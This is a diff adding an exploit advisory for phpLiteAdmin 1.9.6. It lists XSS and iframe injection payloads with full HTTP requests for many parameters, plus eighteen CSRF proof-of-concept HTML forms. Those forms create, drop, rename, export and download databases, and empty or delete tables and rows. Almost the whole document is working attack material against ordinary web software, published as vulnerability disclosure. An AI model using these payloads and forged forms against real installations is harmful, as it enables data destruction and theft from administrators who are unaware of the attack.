@@ -1,0 +1,767 @@
+#################################################################################################################################################
+# Exploit Title: phpLiteAdmin v1.9.6 - Multiple Vulnerabilities
+# Date: 20.04.2016
+# Exploit Author: Ozer Goker
+# Vendor Homepage: https://www.phpliteadmin.org
+# Software Link:
+https://bitbucket.org/phpliteadmin/public/downloads/phpLiteAdmin_v1-9-6.zip
+# Version: 1.9.6
+#################################################################################
+
+Introduction
+phpLiteAdmin is a web-based SQLite database admin tool written in PHP with
+support for SQLite3 and SQLite2. source = https://www.phpliteadmin.org
+
+
+Vulnerabilities: CSRF | HTML(or Iframe) Injection | XSS
+
+
+XSS details:
+#################################################################################
+
+XSS1
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+0_defaultoption
+
+PAYLOAD
+"><script>alert(1)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?action=table_create&confirm=1 HTTP/1.1
+
+tablename=testtable&rows=2&0_field=id&0_type=INTEGER&0_defaultoption=defined"><script>alert(1)</script>&0_defaultvalue=1&1_field=name&1_type=INTEGER&1_defaultoption=defined&1_defaultvalue=test
+
+#################################################################################
+
+XSS2
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?view=import
+
+METHOD
+Post
+
+PARAMETER
+file
+
+PAYLOAD
+"><script>alert(2)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?view=import HTTP/1.1
+
+Content-Type: multipart/form-data;
+boundary=---------------------------1675024292505
+Content-Length: 1124
+
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import_type"
+
+sql
+-----------------------------1675024292505
+Content-Disposition: form-data; name="single_table"
+
+testtable
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import_csv_fieldsterminated"
+
+;
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import_csv_fieldsenclosed"
+
+"
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import_csv_fieldsescaped"
+
+\
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import_csv_replacenull"
+
+NULL
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import_csv_fieldnames"
+
+on
+-----------------------------1675024292505
+Content-Disposition: form-data; name="file"; filename="test"
+Content-Type: text/plain
+
+"><script>alert(2)</script>
+-----------------------------1675024292505
+Content-Disposition: form-data; name="import"
+
+Import
+-----------------------------1675024292505--
+
+
+#################################################################################
+
+XSS3
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?view=sql
+
+METHOD
+Post
+
+PARAMETER
+queryval
+
+PAYLOAD
+"><script>alert(3)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?view=sql HTTP/1.1
+
+queryval=%22%3E%3Cscript%3Ealert%283%29%3C%2Fscript%3E&delimiter=%3B&query=Go
+
+#################################################################################
+
+XSS4
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=view_create&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+select
+
+PAYLOAD
+"><script>alert(4)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?action=view_create&confirm=1 HTTP/1.1
+
+viewname=test&select="><script>alert(4)</script>&createtable=Go
+
+#################################################################################
+
+XSS5
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+viewname
+
+PAYLOAD
+<script>alert(5)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1 HTTP/1.1
+
+viewname=test<script>alert(5)</script>
+
+
+#################################################################################
+
+XSS6
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=row_view&table=testtable
+
+METHOD
+Post
+
+PARAMETER
+numRows
+
+PAYLOAD
+'><script>alert(6)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?action=row_view&table=testtable HTTP/1.1
+
+show=Show+%3A+&numRows=30%27%3E%3Cscript%3Ealert%286%29%3C%2Fscript%3E&startRow=0&viewtype=table
+
+#################################################################################
+
+XSS7
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=column_confirm&action2=%27%3E%3Cscript%3Ealert%287%29%3C/script%3E&pk=id
+
+METHOD
+Get
+
+PARAMETER
+action2
+
+PAYLOAD
+'><script>alert(7)</script>
+
+#################################################################################
+
+XSS8
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+tablename
+
+PAYLOAD
+%3cscript%3ealert(8)%3c%2fscript%3e
+
+Request
+POST /phpliteadmin/phpliteadmin.php?action=table_create&confirm=1 HTTP/1.1
+
+tablename=testtable%3cscript%3ealert(8)%3c%2fscript%3e&rows=2&0_field=id&0_type=INTEGER&0_defaultoption=defined&0_defaultvalue=1&1_field=name&1_type=INTEGER&1_defaultoption=defined&1_defaultvalue=test
+
+#################################################################################
+
+XSS9
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+oldname
+
+PAYLOAD
+<script>alert(9)</script>
+
+Request
+POST /phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1 HTTP/1.1
+
+oldname=testtable<script>alert(9)</script>&newname=test&rename=Rename
+
+#################################################################################
+
+
+HTML Injection details:
+#################################################################################
+
+HTML Injection1
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1
+METHOD
+Post
+
+PARAMETER
+0_defaultoption
+
+PAYLOAD
+"><iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+HTML Injection2
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?view=import
+
+METHOD
+Post
+
+PARAMETER
+file
+
+PAYLOAD
+"><iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+HTML Injection3
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?view=sql
+
+METHOD
+Post
+
+PARAMETER
+queryval
+
+PAYLOAD
+"><iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+HTML Injection4
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=view_create&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+select
+
+PAYLOAD
+"><iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+HTML Injection5
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+viewname
+
+PAYLOAD
+<iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+HTML Injection6
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=row_view&table=testtable
+
+METHOD
+Post
+
+PARAMETER
+numRows
+
+PAYLOAD
+'><iframe src=https://www.phpliteadmin.org>
+
+
+#################################################################################
+
+HTML Injection7
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=column_confirm&action2=%27%3E%3Ciframe%20src=https://www.phpliteadmin.org%3E&pk=id
+
+METHOD
+Get
+
+PARAMETER
+action2
+
+PAYLOAD
+'><iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+HTML Injection8
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1
+
+METHOD
+Post
+
+PARAMETER
+oldname
+
+PAYLOAD
+<iframe src=https://www.phpliteadmin.org>
+
+#################################################################################
+
+
+CSRF details:
+
+#################################################################################
+
+CSRF1
+
+Create Database
+
+<html>
+<body>
+<form action="http://localhost/phpliteadmin/phpliteadmin.php" method="POST">
+<input type="text" name="new_dbname" value="db"/>
+<input type="submit" value="Create DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF2
+
+Drop Database
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?database_delete=1"
+method="POST">
+<input type="text" name="database_delete" value=".\db"/>
+<input type="submit" value="Drop DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF3
+
+Execute SQL
+
+<html>
+<body>
+<form action="http://localhost/phpliteadmin/phpliteadmin.php?view=sql"
+method="POST">
+<input type="text" name="queryval" value="test"/>
+<input type="text" name="delimiter" value=";"/>
+<input type="text" name="query" value="go"/>
+<input type="submit" value="Execute SQL"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF4
+
+Export DB
+
+<html>
+<body>
+<form action="http://localhost/phpliteadmin/phpliteadmin.php?view=export"
+method="POST">
+<input type="text" name="tables[]" value="testtable"/>
+<input type="text" name="export_type" value="sql"/>
+<input type="text" name="structure" value="on"/>
+<input type="text" name="data" value="on"/>
+<input type="text" name="transaction" value="on"/>
+<input type="text" name="comments" value="on"/>
+<input type="text" name="export_csv_fieldsterminated" value=";"/>
+<input type="text" name="export_csv_fieldsenclosed" value="""/>
+<input type="text" name="export_csv_fieldsescaped" value="\"/>
+<input type="text" name="export_csv_replacenull" value="NULL"/>
+<input type="text" name="export_csv_fieldnames" value="on"/>
+<input type="text" name="filename" value="db_2016-04-20.dump"/>
+<input type="text" name="export" value="Export"/>
+<input type="submit" value="Export DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF5
+
+Download Database
+
+<html>
+<body>
+<form action="http://localhost/phpliteadmin/phpliteadmin.php" method="GET">
+<input type="text" name="download" value=".\db"/>
+<input type="submit" value="Download DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF6
+
+Import Table
+
+URL
+http://localhost/phpliteadmin/phpliteadmin.php?view=import
+
+Request
+POST /phpliteadmin/phpliteadmin.php?view=import HTTP/1.1
+
+Content-Type: multipart/form-data;
+boundary=---------------------------28282942824983
+Content-Length: 1410
+
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import_type"
+
+sql
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import_csv_fieldsterminated"
+
+;
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import_csv_fieldsenclosed"
+
+"
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import_csv_fieldsescaped"
+
+\
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import_csv_replacenull"
+
+NULL
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import_csv_fieldnames"
+
+on
+-----------------------------28282942824983
+Content-Disposition: form-data; name="file";
+filename="db_2016-04-20.dump.sql"
+Content-Type: text/sql
+
+----
+-- phpLiteAdmin database dump (https://bitbucket.org/phpliteadmin/public)
+-- phpLiteAdmin version: 1.9.6
+-- Exported: 12:50am on April 20, 2016 (BST)
+-- database file: .\db
+----
+BEGIN TRANSACTION;
+
+----
+-- Table structure for testtable
+----
+CREATE TABLE 'testtable' ('id' INTEGER DEFAULT 1 );
+
+----
+-- Data dump for testtable, a total of 1 rows
+----
+INSERT INTO "testtable" ("id") VALUES ('1');
+COMMIT;
+
+-----------------------------28282942824983
+Content-Disposition: form-data; name="import"
+
+Import
+-----------------------------28282942824983--
+
+#################################################################################
+
+CSRF7
+
+Database Vacuum
+
+<html>
+<body>
+<form action="http://localhost/phpliteadmin/phpliteadmin.php?view=vacuum"
+method="POST">
+<input type="text" name="vacuum" value="Vacuum"/>
+<input type="submit" value="DB Vacuum"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF8
+
+Database Rename
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?view=rename&database_rename=1"
+method="POST">
+<input type="text" name="oldname" value=".\db1"/>
+<input type="text" name="newname" value=".\db"/>
+<input type="text" name="rename" value="Rename"/>
+<input type="submit" value="DB Rename"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF9
+
+Create Table
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_create&confirm=1"
+method="POST">
+<input type="text" name="tablename" value="testtable"/>
+<input type="text" name="rows" value="1"/>
+<input type="text" name="0_field" value="id"/>
+<input type="text" name="0_type" value="INTEGER"/>
+<input type="text" name="0_defaultoption" value="defined"/>
+<input type="text" name="0_defaultvalue" value="1"/>
+<input type="submit" value="Create Table"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF10
+
+Insert Table
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=row_create&confirm=1"
+
+
+method="POST">
+<input type="text" name="numRows" value="1"/>
+<input type="text" name="function_0_id" value=""/>
+<input type="text" name="0:id" value="1"/>
+<input type="text" name="fields" value="id"/>
+<input type="submit" value="Insert Table"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF11
+
+Row Delete
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=row_delete&confirm=1&pk=%5B
+
+%22%5B1%5D%22%5D" method="POST">
+<input type="submit" value="Row Delete"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF12
+
+Search Field
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?table=testtable&action=table_search&done=1"
+
+
+method="POST">
+<input type="text" name="id:operator" value="="/>
+<input type="text" name="id" value="1"/>
+<input type="submit" value="Search Field"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF13
+
+Rename Table
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_rename&confirm=1"
+method="POST">
+<input type="text" name="oldname" value="test"/>
+<input type="text" name="newname" value="testtable"/>
+<input type="text" name="rename" value="Rename"/>
+<input type="submit" value="Rename Table"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF14
+
+Empty Table
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_empty&confirm=1"
+method="POST">
+<input type="text" name="tablename" value="testtable"/>
+<input type="submit" value="Empty Table"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF15
+
+Drop Table
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?action=table_drop&confirm=1"
+method="POST">
+<input type="text" name="tablename" value="testtable"/>
+<input type="submit" value="Drop Table"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF16
+
+Create View
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?action=view_create&confirm=1"
+method="POST">
+<input type="text" name="viewname" value="test"/>
+<input type="text" name="select" value="select * from testtable;"/>
+<input type="text" name="createtable" value="go"/>
+<input type="submit" value="Create View"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF17
+
+Drop View
+
+<html>
+<body>
+<form action="
+http://localhost/phpliteadmin/phpliteadmin.php?action=view_drop&confirm=1"
+method="POST">
+<input type="text" name="viewname" value="test"/>
+<input type="submit" value="Drop View"/>
+</form>
+</body>
+</html>
+
+#################################################################################
+
+CSRF18
+
+Logout
+
+<html>
+<body>
+<form action="http://localhost/phpliteadmin/phpliteadmin.php" method="POST">
+<input type="hidden" name="logout" value="Logout"/>
+<input type="submit" value="Logout"/>
+</form>
+</body>
+</html>
+
+#################################################################################
